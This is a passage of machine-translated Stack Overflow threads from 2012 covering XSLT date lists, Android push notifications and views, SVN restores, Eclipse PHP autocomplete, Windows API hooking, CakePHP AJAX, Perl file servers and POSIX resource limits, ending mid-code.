> 时间：2012-04-09T06:32:05.317
> 
> 标签：xml, xslt, xslt-1.0

我需要获取两个日期之间的日期列表 - 例如，我有开始日期 03302012 和结束日期 05302012，我需要像这样的输出

```
03302012
03312012
04012012
04022012
...
05282012
05292012
05302012

```

*   随意使用您的日期格式 - 我将自己进行转换。非常感谢你！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T20:06:50.247

您可以通过使用递归模板来做到这一点。这不是最好的解决方案，因为这会受到堆栈溢出或内存不足错误的影响（如果您给它的日期间隔足够大），但它可以是一个开始的地方。

下面的示例需要的第一件事是检查生成的值并确保它是有效日期（您可以在网上找到一些示例；我只是使用[了来自开源项目](http://www.getsymphony.com/download/xslt-utilities/source-code/54294/)的示例并在示例中导入了文件只是为了让它更短）。

然后，想法是通过在前一天添加一天，然后在当前一天添加一天来生成日期，依此类推。如果日期溢出，则在月份中添加一个并从第 1 天重新开始。如果月份溢出，则对年份执行相同操作并从第 1 个月开始。理论上唯一不会溢出的是年份（但您会限制与区间的结束值）。

您生成一个日期并验证它。如果它是有效的并且没有达到间隔的结尾，你尝试通过添加天数来生成另一个（这就是在块 X 中发生的事情）。

当你得到一个无效的值时，就会溢出一些东西。它只能是天或月（如上所述）。我首先检查月份（块 Y）。如果是这种情况，我会从第 1 个月的第 1 天开始，但要从下一年开始。如果是溢出的那一天（块 Z），那么我从下个月的第一天开始。

```
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

  <xsl:import href="http://www.getsymphony.com/download/xslt-utilities/source-code/54294/"/>
  <xsl:output method="xml" omit-xml-declaration="yes" encoding="UTF-8" indent="yes" />

  <xsl:variable name="startDate" select="'03302012'" />  <!-- MMddyyyy format -->
  <xsl:variable name="endDate" select="'05302012'" /> <!-- MMddyyyy format -->

  <xsl:template match="/">
    <values>
      <xsl:call-template name="GenerateList">
        <xsl:with-param name="day" select="number(substring($startDate, 3, 2))" />
        <xsl:with-param name="month" select="number(substring($startDate, 1, 2))" />
        <xsl:with-param name="year" select="number(substring($startDate, 5))" />
      </xsl:call-template>
    </values>
  </xsl:template>

  <xsl:template name="GenerateList">
    <xsl:param name="day" select="1" />
    <xsl:param name="month" select="1" />
    <xsl:param name="year" select="1" />

    <!-- 1 = valid, 0 = invalid according to the imported file -->
    <xsl:variable name="validationResult">
      <xsl:call-template name="date-is-valid">
        <xsl:with-param name="day" select="$day"/>
        <xsl:with-param name="month" select="$month"/>
        <xsl:with-param name="year" select="$year"/>
      </xsl:call-template>
    </xsl:variable>

    <xsl:choose>
      <xsl:when test="$validationResult = 0">

        <xsl:choose>
          <xsl:when test="$month &gt; 12">
            <!-- block Y -->
            <xsl:call-template name="GenerateList">
              <xsl:with-param name="day" select="1" />
              <xsl:with-param name="month" select="1" />
              <xsl:with-param name="year" select="$year + 1" />
            </xsl:call-template>
          </xsl:when>
          <xsl:otherwise>
            <!-- block Z --> 
            <xsl:call-template name="GenerateList">
              <xsl:with-param name="day" select="1" />
              <xsl:with-param name="month" select="$month + 1" />
              <xsl:with-param name="year" select="$year" />
            </xsl:call-template>
          </xsl:otherwise>
        </xsl:choose>

      </xsl:when>
      <xsl:otherwise>
        <!-- block X -->
        <!-- same MMddyyyy format as the interval values -->
        <xsl:variable name="currentDate" select="concat(format-number($month, '00'), format-number($day, '00'), $year)" />
        <value>
          <xsl:value-of select="$currentDate" />
        </value>
        <xsl:if test="not($currentDate = $endDate)">
          <xsl:call-template name="GenerateList">
            <xsl:with-param name="day" select="$day + 1" />
            <xsl:with-param name="month" select="$month" />
            <xsl:with-param name="year" select="$year" />
          </xsl:call-template>
        </xsl:if>

      </xsl:otherwise>
    </xsl:choose>

  </xsl:template>
</xsl:stylesheet> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T21:49:40.393

不幸的是，XSLT 1.0 本身并不适合此类任务，但它的环境通常可以。以下是我自己使用的一些方法：

1.  最简单的解决方案通常是将此类列表作为输入的一部分 =)

2.  XSLT 转换通常是具有特定 XSLT 处理器的大型应用程序的一部分，它允许使用特定方法对其进行扩展。您可以编写返回所需节点集的扩展函数（使用 Java、Javascript、PHP、Python，具体取决于处理器）。另一个但类似的选项是注册一个“流”（至少就 PHP 而言）并使用`document`带有 url 之类的函数获取节点集`app://Dates/listdates?start=a&end=b`。缺点是样式表与应用程序耦合在一起，不能单独开发。

3.  大多数 XSTL 处理器都支持 EXSLT 扩展。您可以使用日期扩展计算日期之间的天数，使用`padding`来自字符串扩展的函数生成长度字符串，将字符串除以空字符串以获取令牌列表（具有所需长度）并使用迭代列表`node-set`函数并使用 . 将当前节点位置添加到第一个日期`date-add`。

4.  按照 Bogdan 的建议，使用纯 XSLT 和递归模板。

# android - ServerSocket 是实现 android 推送通知的好主意吗？

> ID：10069782
> 
> 赞同：2
> 
> 时间：2012-04-09T06:33:07.507
> 
> 标签：android, push-notification

我想开发没有 C2DM 的推送通知。然后我用谷歌搜索并找到了一些实现推送通知的方法。

1.  轮询 - 不是一个好的解决方案
2.  SMS - 昂贵的解决方案
3.  持久连接 - 可接受的解决方案

我知道很多程序员使用长连接来实现推送服务，但我觉得也太贵了。所以我有了一个想法，通过客户端ServerSocket来实现推送服务。这里有什么问题吗？（例如安全或电池问题等）每当客户端的网络发生变化时，将IP地址更新到服务器，当事件发生时，服务器建立与android客户端的连接。

任何意见将不胜感激！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T06:47:14.743

使用 TCP/IP (Socket) 实现有一些缺点。很难实现可靠的服务，因为当 android 客户端的内存变低时，Android 操作系统会终止服务。所以当您的手机处于睡眠模式或任何其他模式时，可能会发生这种情况情况。

但是你仍然可以通过AndroidPushNotificationsDemo实现服务器端推送到android。有一个框架叫mqtt。该框架已放在[https://github.com/tokudu/AndroidPushNotificationsDemo](https://github.com/tokudu/AndroidPushNotificationsDemo)中，通过此链接您将获得更多信息：

[http://tokudu.com/2010/how-to-implement-push-notifications-for-android/](http://tokudu.com/2010/how-to-implement-push-notifications-for-android/)

在以下 stackoverflow 线程中有类似的帖子。 [Android 平台中的推送通知](https://stackoverflow.com/questions/1378671/push-notifications-in-android-platform)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T14:19:25.447

我想补充一点，您的过程 - 无论多么小 - 都会耗尽电池电量。用户可能会注意到/怀疑.. 从这个角度来看，C2DM 是一个非常好的解决方案

# linux - SVN 还原转储未成功保存

> ID：10069783
> 
> 赞同：0
> 
> 时间：2012-04-09T06:33:20.197
> 
> 标签：linux, svn, dump, redhat

我已将 svn 转储到文件 phpmyadmin.dump

当我尝试使用以下命令行将转储文件保存到我的新存储库路径时：

```
svnadmin load /usr/local/zend/apache2/htdocs/repository/phpmyadmin/ < /home/admin/phpmyadmin.dump 
```

我在下面收到此警告消息：

> <<< 开始新事务，基于原始版本 1 svnadmin：文件已存在：文件系统 '/usr/local/zend/apache2/htdocs/repository/phpmyadmin/db'，事务 '1-h'，路径 'CREDITS' *添加路径：CREDITS ...

请帮我解决这个问题，谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T17:23:24.977

加载转储时，通常从一个空存储库开始。看起来您正在尝试将存储库重新加载到已经存在的存储库中。

```
$ cd /usr/local/zend/apache2/htdocs/repository  #Might as well be where the action is
$ svn create phpmyadmin_new   #You can rename it later
$ svn load --force-uuid phpmyadmin_new < /home/admin/phpmyadmin.dump 
```

现在，如果您想将此新存储库加载到当前存储库中，则必须使用`--parent-dir`参数指定一个新的空白目录。

请记住：只需创建一个空存储库，不要在其中创建任何目录。

# php - 用于 PHP 函数的 Eclipse PDT Intellisense

> ID：10069794
> 
> 赞同：8
> 
> 时间：2012-04-09T06:34:14.713
> 
> 标签：php, eclipse, intellisense, eclipse-pdt

所以智能感知适用于我自己的变量、方法等，但不适用于 php 函数，例如`in_array`......我只是打开一个 PHP 文件而不是创建一个项目。当我创建一个 PHP 项目并在该项目中创建一个 php 文件时，它可以工作。但是在打开单个 php 文件时不起作用。

当我只打开一个 php 文件时，VS2010 的 VS.Php 具有 php 函数的智能感知功能。我想在 Eclipse 中模拟这个功能。有谁知道如何让 Eclipse PDT 在打开文件时显示 php 函数？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T12:51:46.037

据我所知，Eclipse 没有这样的功能。Eclipse 在项目上下文中运行良好。据我了解，当您在 Eclipse 中创建 PHP 项目时，它会在此特定上下文中添加 PHP 核心库。这是有道理的，因为 Eclipse 支持多种语言，我用它来开发 C、Java 和 PHP，我当然不希望在启动时或每次打开文件时都加载所有库。

为了处理您的问题，我创建了“默认”项目。我有“PHPDefault”、“JavaDefault”和 C++Default，每个都有适当的设置和库。如果您需要从您的操作系统打开单个 PHP 文件，请将其拖到您的项目中，如果您想从远程位置打开它，请将其复制到您的默认项目文件夹并从 Eclipse 中刷新它以使其出现。

这是我知道的唯一方法，如果它适合你，请告诉我。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-21T16:59:44.710

您是否尝试过用于 PHP 的 netbeans？在过去的 2 年中，我使用 netbeans+apache+php5+MySQL+MongoDB 进行了开发，并一直在 Ubuntu 机器上使用 Netbeans。目前它唯一缺少的是 Mongo 对象的代码完成（智能感知）。除此之外，它还会读取您的代码并完成 PHP 功能。它建立在 Eclipse 之上（或至少从 Eclipse 派生）。我想这就是你要找的一切。

干杯

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-24T12:15:44.967

使用 Eclipse / Netbeans，您不能在没有项目的情况下对单个文件进行自动完成。

我使用记事本++：为了激活自动完成，请转到“设置”>“首选项”>“备份/自动完成”选项卡并选中该选项。

# windows - 特定进程的 API 监控

> ID：10069796
> 
> 赞同：1
> 
> 时间：2012-04-09T06:34:32.733
> 
> 标签：windows, winapi, hook, monitoring, process

就像在我的名为“myprocess.exe”的进程中监控一些windows api函数一样。
我知道广泛的系统挂钩（全局挂钩）可以做这样的事情，但我只想在**特定的进程**上设置它。
C/C++/Python 中的任何示例代码都会有所帮助，还有一些教程可以帮助我，很高兴在这里与我分享。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T14:10:46.690

看看微软研究院的“Detours”。此外，您可以使用调试器通过在感兴趣的 api 函数上设置断点、转储参数、运行到返回地址，然后转储返回值来执行此操作。这具有作为一个更加手动的过程的缺点。最后，windbg（来自“Debugging Tools for Windows”包）具有 wt 命令，它将跟踪函数调用到您指定的任何深度。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T11:03:18.293

[http://easyhook.codeplex.com/](http://easyhook.codeplex.com/)有一个简单的 C++ API 和 C# (.NET) API。支持64位。

如果您只想监控研究，您可以使用 winapioverride32 (http://jacquelin.potier.free.fr/winapioverride32/)。它提供 API 监控，并且是开源的！

# jquery - 带有cakephp的jquery ajax：更改事件正在触发但下拉框未填充

> ID：10069797
> 
> 赞同：0
> 
> 时间：2012-04-09T06:34:38.183
> 
> 标签：jquery, ajax, cakephp, onchange

以下 jquery ajax 代码适用于 #MerryParentEmail keyup 事件，但不适用于 #MerryParentState 更改事件。更改事件正在触发，但城市下拉框未填充。

```
<script type="text/javascript">
  $(document).ready(function(){
         $("#MerryParentStateId").change(function(){
        state=$(this).val();
        txt_str="state_id="+state;
        $.get("../students/getcities",txt_str,function(result){
            $("#MerryParentCityId").html(result);
        });
     });

 });

</script> 
```

student_controller.php

```
 function getcities(){
    $options = $this->Student->MerryParent->City->getCities($this->data['MerryParent']['state_id']);
    print_r($options);
    foreach ($options as $k=>$v){
        echo '<option value="'.$k.'">'.$v.'</option>';
    }

} 
```

添加.ctp

```
<?php
echo $this->Session->flash();

echo $this->Form->create('Student');
echo '<fieldset>';
echo '<legend>Student Information</legend>';
echo $this->Form->input('Student.name');

$options = array('Male'=>'Male','Female'=>'Female');
$attributes = array('value'=>'Male');
echo $this->Form->radio('Student.gender',$options,$attributes);

echo $this->Form->input('Student.dob', array('label'=>'Date of Birth',
                'dateFormat'=>'DMY', 
                'empty'=>'Choose one',
                'timeFormat' => '', 
            'minYear' => ( 
                    date('Y') - 5 
            ), 
            'maxYear' => ( 
                    date('Y') - 2 
            ) 
            ));
echo $this->Form->input('Student.merry_class_id', 
        array(
        'label'=>'Enquiry Class for',
        'empty'=>'Choose one',
        'options'=>array('1'=>'Playgroup','2'=>'Nursery','3'=>'LKG', '4'=>'UKG')
        )
        );

echo '</fieldset>';

echo '<fieldset>';
echo '<legend>Parent Information</legend>';
//echo $form->input('Student.parent_id', array('type'=>'hidden'));
echo $this->Form->input('MerryParent.initial', 
array('empty'=>'Choose one',
'options'=>array('Dr'=>'Dr', 
                'Mr'=>'Mr', 
                'Mrs'=>'Mrs', 
                'Ms'=>'Ms')
)
);
echo $this->Form->input('MerryParent.email');
echo $this->Form->input('MerryParent.name', array('label'=>'Parent/Guardian Name'));
echo $this->Form->input('MerryParent.landline');
echo $this->Form->input('MerryParent.mobile');
echo $this->Form->input('MerryParent.address');
echo $this->Form->input('MerryParent.state_id', array('empty'=>'Choose one','options'=>$states));
echo $this->Form->input('MerryParent.city_id');
echo $this->Form->input('MerryParent.postal_code');
echo '</fieldset>';

echo $this->Form->end('Submit');
 ?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T03:41:07.020

当我修改 student_controller.php 中的 getcities 函数以包含

```
$this->data['MerryParent']['state_id']=$_GET['state_id']; 
```

城市下拉框正在填充所选州的城市。

因此，以下是修改后的 getcities 函数：

```
function getcities(){
    $this->data['MerryParent']['state_id']=$_GET['state_id'];
    if (!empty($this->data['MerryParent']['state_id'])){
       $cities = $this->Student->MerryParent->City->getCities($this->data['MerryParent']['state_id']);
    //print_r($cities);
    foreach ($cities as $k=>$v){
        echo '<option value="'.$k.'">'.$v.'</option>';
    }

        /* foreach($cities as $optionValue){
            echo '<option>' . $optionValue . '</option>';
        }*/
    }else{
        $this->Session->setFlash('You didn\'t select a state!');
    }

} 
```

谢谢你。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-03T19:36:24.410

```
function formatosDinamicos(){
$id_a = $_GET['agente_id'];
if(!empty($id_a)){
    $listaFormato = $FormatoController->listaVariableFormatoDependent($id_a);
    foreach ($listaFormato as $k=>$v){ 
        echo '<option value="'.$k.'">'.$v.'</option>'; 
    }
}else{
    $this->Session->setFlash('Error!');
}
$this->autoRender = false;
} 
```

在函数 autoRender 的按钮中为 false

# perl - 我可以使用 HTTP::Server::Simple 作为下载 http 服务器吗？

> ID：10069798
> 
> 赞同：0
> 
> 时间：2012-04-09T06:34:49.220
> 
> 标签：perl, webserver, download

我需要设置一个下载 HTTP 服务器，我不想安装 Apache。

我可以使用[HTTP::Server::Simple](https://www.metacpan.org/module/HTTP%3a%3aServer%3a%3aSimple)作为下载 http 服务器吗？你能给我一些示例代码吗？

或者是否有其他 CPAN 模块可以帮助我快速简单地设置下载 HTTP 服务器？

```
sub download {
 my $cgi  = shift;   # CGI.pm object
 return if !ref $cgi;

 my $file = $cgi->param('file'); #file=test.tar.gz
 $file="/var/download/$file";    #file=/var/download/test.tar.gz 

 # send this file
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-09T09:27:00.350

与 mugen kenichi 对 Plack 的回答相同：

```
plackup -MPlack::App::Directory -e'Plack::App::Directory->new({ root => "." })->to_app' 
```

这已经处理了 David-SkyMesh 评论的内容，并且很容易从命令行混合 Authn/Authz。可以通过添加`-s Starman`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-09T15:34:57.413

您还可以使用[App::HTTPThis](https://metacpan.org/module/http_this)。安装后：

```
http_this dir_name 
```

可能没有比这更容易的了。事实上，如果您已经在要导出的目录中，则可以跳过 dir_name 参数。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-04-09T08:01:50.980

As stated in the comments this is no trivial problem. However, if i need a quick and simple server to provide files I usualy do

```
python -m SimpleHTTPServer 
```

in the directory I want to serve. It starts a webserver at `0.0.0.0:8000` and you can point your browser there to download the files.

I do not know if a similar one line solution exists for perl but I guess it does not get any more simple than that.

# java - 从 Android 应用程序将数据发布到 PHP 脚本

> ID：10069801
> 
> 赞同：0
> 
> 时间：2012-04-09T06:35:03.673
> 
> 标签：java, php, android, httpclient

我正在尝试从 Android 手机应用程序将数据发布到 PHP 脚本。这是我正在使用的代码。

```
public class Upload extends Activity implements OnClickListener {
EditText joke;
Button upload;
AlertDialog alertDialog = new AlertDialog.Builder(this).create();
@Override
protected void onCreate(Bundle savedInstanceState) {
    // TODO Auto-generated method stub
    super.onCreate(savedInstanceState);
    setContentView(R.layout.upload);
}
public void onClick(View v) {
    // TODO Auto-generated method stub
    switch (v.getId()) {
    case R.id.bUpload:
        uploadJoke();
        break;
    }

}
private void uploadJoke() {
    // Create a new HttpClient and Post Header
    HttpClient httpclient = new DefaultHttpClient();
    HttpPost httppost = new HttpPost("http://xxxx/telejoke.php");

    try {
        // Add your data
        List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
        nameValuePairs.add(new BasicNameValuePair("username", "test"));
        nameValuePairs.add(new BasicNameValuePair("joke", joke.getText().toString()));
        httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));

        // Execute HTTP Post Request
        HttpResponse response = httpclient.execute(httppost);

    } catch (ClientProtocolException e) {
        alertDialog.setTitle("Client Protocol Exception");
    } catch (IOException e) {
        alertDialog.setTitle("IOException");
    }
} 
```

}

但是，当我尝试在我的 android 手机上运行它时，它会因意外错误而崩溃。对此的帮助表示赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-12-26T20:51:10.547

`AlertDialog alertDialog = new AlertDialog.Builder(this).create();`在该方法内移动`UploadJoke`可解决此问题。

# android - Android : 如何在 android 应用程序上出售一些图像（编码）

> ID：10069807
> 
> 赞同：-1
> 
> 时间：2012-04-09T06:36:01.177
> 
> 标签：android, in-app-purchase

我创建了一个 android 应用程序来显示很多图像，其中一些是免费的，但对于其余的我希望用户购买它们，我该如何出售这些图像？
我应该添加什么代码让用户使用 android 市场购买图像。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T06:44:11.613

`Paypal`是一个不错的选择。它有一个 Java api，我认为它应该做你想要的。

# android - findViewById(R.id.list_view); 返回“空”

> ID：10069809
> 
> 赞同：0
> 
> 时间：2012-04-09T06:36:16.327
> 
> 标签：android

我正在尝试显示`ListView`.

我已经创建了一个`activity`，在`onCreate()`方法中我正在启动一个`AsyncTask`，在`onPostExecute()`方法中我正在尝试`ListView`在其中显示。

但`listView`对象接收空..

下面是代码片段。

```
 protected void onPostExecute(KpiResponseObject kpiReportResponse) {
     ListView listView;
     listView = (ListView) findViewById(R.id.list_view);
} 
```

`listView`在这里，我在对象中收到 null 。

我怀疑这是`context`问题所在，但无法弄清楚它到底是什么。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T06:40:05.040

你确定你有`setContentView`你的`onCreate`，然后有一个`ListView` `list_view`在 XML 中定义的？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T06:39:14.620

您放入的布局`setContentView()`没有任何 id 为`list_view`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-09T06:40:16.620

@brig 这几乎是 100% 的上下文问题。您应该从其中一个覆盖视图中调用 findViewByID。一个简单的解决方案就是将上下文传递给这个异步任务（我假设这是某种异步任务）。在构造函数中设置一个成员

```
private Context mContext;

public myAsync(Context context){
  mContext = context;
} 
```

然后在你打电话

```
protected void onPostExecute(KpiResponseObject kpiReportResponse) {
     ListView listView;
     listView = (ListView) mContext.findViewById(R.id.list_view);
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-09T06:46:45.260

您可能会得到空值有两个原因，一个是未定义 setContentView(xml)，第二个是您调用 Asynctask 的上下文。检查这两个你想要的东西。

# pthreads - 从进程内部监控 Unix 资源

> ID：10069811
> 
> 赞同：2
> 
> 时间：2012-04-09T06:36:47.207
> 
> 标签：pthreads, posix, pipe, file-descriptor, resource-leak

我有一堆 EAGAIN 试图 fork() 或产生线程，这让我相信我在某处泄漏资源。

在 POSIX 中，是否有可能从进程本身内部获取以下内容：

*   活动 pthread 数
*   活动子进程数
*   活动管道数
*   活动套接字的数量（或者这个和管道可能会被视为文件描述符？）

还是必须手动计算这些？他们已经有柜台了，但我认为其中一个正在泄漏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T17:26:17.320

我猜你得到 EAGAIN 是因为你达到了资源限制。可以运行多少线程/进程有系统限制。你可以查看它

```
cat /proc/sys/kernel/threads-max 
```

并改变它

```
echo 100000 > /proc/sys/kernel/threads-max 
```

分别。您更有可能在进程上达到用户限制。您应该阅读手册页并在`getrlimit`和上进行搜索`ulimit`。SO上有很多关于这些的信息。

假设您从一个父级生成所有这些进程，那么跟踪它们应该很容易。你在你之前在父级中增加一个计数器`fork()`。如果孩子正在产生孩子，那么它会变得更加复杂，您将需要使用共享内存或其他一些 IPC 机制。`wait()`在任何情况下，您都可以使用和系统调用来确定您孩子的状态，并`waitpid()`据此减少您的进程计数器。返回的状态数据`wait`将告诉您每个孩子的终止处置。同样，如果您遇到麻烦，有很多关于 SO 的问题会对此进行相当详细的说明。

在回答您的主要问题时，有一些方法可以查询系统（通常通过 /proc）以获取您关心的一些资源。如果您担心*自己的*资源，这几乎总是错误的方式。您可以自己跟踪它们，而且效率要高得多。

祝你好运。希望这会为您指明正确的方向。

# android - canvas.scale(mScaleFactor,mScaleFactor,detector.getFocusX(),detector.getFocusY()) 拖动限制搞砸了？

> ID：10069817
> 
> 赞同：5
> 
> 时间：2012-04-09T06:37:22.893
> 
> 标签：android, zooming, scale

我试图`ImageView`通过在谷歌和这里搜索来开发一个自定义。

一切正常，除非我尝试使用`mdetector.getFocusX()`和缩放画布`mdetector.getFocusY()`。
缩放正确发生，但拖动计算变得一团糟。

当我`canvas.scale(mScaleFactor,mScaleFactor,gx,gy)`在下面的代码中使用时，整个地方都会发生拖动，并且可以看到后面的黑屏。
我想将拖动限制在屏幕范围内。

在我的代码中，绑定计算适用于放大，即：当它在不使用枢轴点的情况下`canvas.scale(mScaleFactor,mScaleFactor)`放大时它可以正常工作。`(0,0)`

这是代码：

```
import android.content.Context;
import android.graphics.Canvas;
import android.util.AttributeSet;
import android.util.Log;
import android.view.MotionEvent;
import android.view.ScaleGestureDetector;
import android.view.View;
import android.widget.ImageView;

/* @description : Custom View Zoom
 *
 */

public class ZoomView extends ImageView {

    // Maximum and Minimum Zoom
    private static float MIN_ZOOM = 1.0f;
    private static float MAX_ZOOM = 3.0f;

    //Different Operation to be used 
    private final int NONE_OPERATION=0;
    private final int DRAG_OPERATION=1;
    private final int ZOOM_OPERATION=2;
    private float mWidth= 1047;
    private float mHeight=800; 
    private boolean dragged=true;

    // Mode to select the operation
    private int mode;

    //Track X and Y coordinate of the finger when it first touches the screen
    private float mInitialX = 0f;
    private float mInitialY = 0f;

    //Track the amount to translate(Drag) the canvas along the X and the Y coordinate
    private float mTranslateX = 0f;
    private float mTranslateY = 0f;

    //Track the last translated X and the Y coordinate while panning so that canvas does not get the jerk (Issue was happening when we change the position again and again ) 
    private float mPreviousTranslateX = 0f;
    private float mPreviousTranslateY = 0f;

    //ScalingFactor i.e. Amount of Zoom
    private float mScaleFactor = 1.0f;
    float gx=0,gy=0;

    private ScaleGestureDetector mDetector;

    // Called if used from code 
    public ZoomView(Context context) {
            super(context);
        // Intialize ScaleGestureDetector
        mDetector = new ScaleGestureDetector(context, new ZoomListener());

    }

    //Called if used from XML
    public ZoomView(Context context, AttributeSet attrs) {
        super(context, attrs);
        mDetector = new ScaleGestureDetector(context, new ZoomListener());

    }

    //Everything that is going to reflect on the screen will happen in on draw
    @Override
    protected void onDraw(Canvas canvas) {

    //Save the canvas to set the scaling factor returned from detector
        canvas.save();
        canvas.scale(mScaleFactor, mScaleFactor,gx,gy);
        Log.d("Print", "mScaleFactor::" + mTranslateX);
        Log.d("Print", " mTranslateX::" + (mScaleFactor - 1) * mWidth);
    //Check the bound that we never pan past the top of left edge of the
    if((mTranslateX) < 0) {
        mTranslateX=0;

    }
    ////Check the right bound.
    // eg : Height of display is 1280\. When it is zoom by 2 it is 1280 . when it is zoom by 3 it is  2560
    // Compare translateX times -1 to (scaleFactor - 1) * displayWidth. 
    //If translateX is greater than that value, then it has gone over the bound. So we set the value of translateX to (1 - scaleFactor) times the display width. 
    // Notice that the terms are interchanged... it's the same as doing -1 * (scaleFactor - 1) * displayWidth
    else if((mTranslateX) > (mScaleFactor - 1) * mWidth){
        mTranslateX=(mScaleFactor - 1 )* mWidth;
        Log.d("Print", " InDraw mTranslateX::" + mTranslateX);
    }

    if((mTranslateY)< 0) 
        mTranslateY=0;
/*  else if((mTranslateY) > (mScaleFactor - 1) * mHeight)
        mTranslateY= (mScaleFactor-1)* mHeight;*/

    //divide by the scale factor here,
    //otherwise it will end up with excessive panning based on our zoom level since the translation amount also gets scaled according to how much we've zoomed into the canvas.
      canvas.translate(mTranslateX / mScaleFactor, mTranslateY / mScaleFactor);    

    // Draw anything more if needed here ....

      // Restore the canvas to balance the save Canvas which removes all the last modification before save.

      super.onDraw(canvas);

        canvas.restore();
    }

    //handle the touch event of the view with the detector to get the scalingFactor and also keep the track of 
    // the touch events like drag and zoom event using booleans 
    @Override
    public boolean onTouchEvent(MotionEvent event) {

        // Handles all type of motion-events possible
        switch(event.getAction() & MotionEvent.ACTION_MASK) {

        case MotionEvent.ACTION_DOWN:
            // Event occurs when the first finger is pressed on the Screen

            // setting the mode to Drag Operation
            mode = DRAG_OPERATION;

            // Store the initial X and Y of the first finger when touches on the Screen. Take the difference with the previous translation so as to avoid the jerk in canvas.
            //Initial difference will be X and Y since previousTranslation will be ZERO.
            mInitialX = event.getX() - mPreviousTranslateX;
            mInitialY = event.getY() - mPreviousTranslateY;

            break;
        case MotionEvent.ACTION_MOVE:
            // Event occurs when the finger move across the screen and also when the finger is kept pressed on the screen

            // Update the translate value constantly as the event is occured at every move
            mTranslateX = event.getX() - mInitialX;             // Translate value is calculated by diff from current and initial
            mTranslateY = event.getY() - mInitialY;

            Log.d("Print", " TranslateX::" + mTranslateX + " Translate Y::" + mTranslateY);

            // If finger is kept pressed it will still consider the move so to avoid that use this value
            //Initial X and Initial Y can not be used directly because they were adjusted  using the previous translation values. So need to add those
            // values to InitialX and InitialY so that the actual coordinates of the finger are retrieved.
            // Using distance Forumla
            double distance = Math.sqrt(Math.pow(event.getX() - (mInitialX + mPreviousTranslateX), 2) + Math.pow(event.getY() - (mInitialY + mPreviousTranslateY), 2));
                if(distance > 0) {
            dragged = true;

            } 

            break;
        case MotionEvent.ACTION_POINTER_DOWN:
            //Event occurs when the second finger is pressed down

            // If second finger is pressed on the screen with the first set the Mode to Zoom operation
            mode=ZOOM_OPERATION;

            break;

        case MotionEvent.ACTION_UP: 
            //Event occurs when all the finger are taken of the screen

            //If all the fingers are taken up there will be no operation 
            mode = NONE_OPERATION;
            dragged= false;
            // All the operations are done.Store the previousTranslate value here. ( Might not need at the time of second finger down ??)
            mPreviousTranslateX = mTranslateX;
            mPreviousTranslateY = mTranslateY;

            break;

        case MotionEvent.ACTION_POINTER_UP:
            // Event occurs when the second finger is taken of the screen while first finger is pressed 

            // Second finger is taken up stop zooming and again Drag Operation 
            mode=DRAG_OPERATION;
            break;
        }

        // give the event to the mDetector to get the scaling Factor
        mDetector.onTouchEvent(event);

        //We need to invalidate the canvas to redraw itself for the changes.Here we need to invalidate only when zoom is done and drag operation has happened 
        //or else for the Zoom which was happening in the onScale function 
        if((mode==DRAG_OPERATION && mScaleFactor!=1f && dragged ) || mode==ZOOM_OPERATION)
        {

            invalidate();
        }

        // we are handling the touch event 
        return true;
    }

/* @name : ZoomListener
 * @description : Class which defines the listener for ScaleGestureDetector while extending abstract 
 * 
 */
    private class ZoomListener extends ScaleGestureDetector.SimpleOnScaleGestureListener {

/*
 * ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 *
 * @description: Method gives the scaleFactor from the detector
 *
 * ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 */
        @Override
        public boolean onScale(ScaleGestureDetector detector) {
            // getting the scaleFactor from the detector
            mScaleFactor *= detector.getScaleFactor();              // gives the scaling factor from the previous scaling to the current
            Log.d("Print", "detector scaling Factor" + mScaleFactor);

            gx = detector.getFocusX();
            gy = detector.getFocusY();

            // Limit the scale factor in the MIN and MAX bound
            mScaleFactor= Math.max(Math.min(mScaleFactor, MAX_ZOOM),MIN_ZOOM);
            Log.d("Print", "Bounded scaling Factor" + mScaleFactor);

            /*//Force canvas to redraw itself only if the one event is to happen (say Zooming only ) else do not invalidate here for multi operations
               As what we de for scrolling or panning will not reflect here. So we will add this in onDraw method 
            invalidate();*/

            // we have handle the onScale 
            return true;
        }

        @Override
            public void onScaleEnd(ScaleGestureDetector detector) {

                super.onScaleEnd(detector);
            }
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-11-24T09:34:58.580

我用这个：

```
public void checkZoom(){
    float[] values = new float[9];
    matrix.getValues(values);
    float scaleX = values[Matrix.MSCALE_X];
    if(scaleX > MAX_ZOOM) {
        setZoom(MAX_ZOOM);
    } 
    else if(scaleX < MIN_ZOOM) {
        setZoom(MIN_ZOOM);
    }
    limitCorners();
}

private void limitCorners() {
    viewWidth = this.getWidth();
    viewHeight = this.getHeight();
    float []m = new float[9];
    matrix.getValues(m);
    float transX = m[Matrix.MTRANS_X];
    float transY = m[Matrix.MTRANS_Y];
    float fixTransX = getFixTrans(transX, viewWidth, getImageWidth());
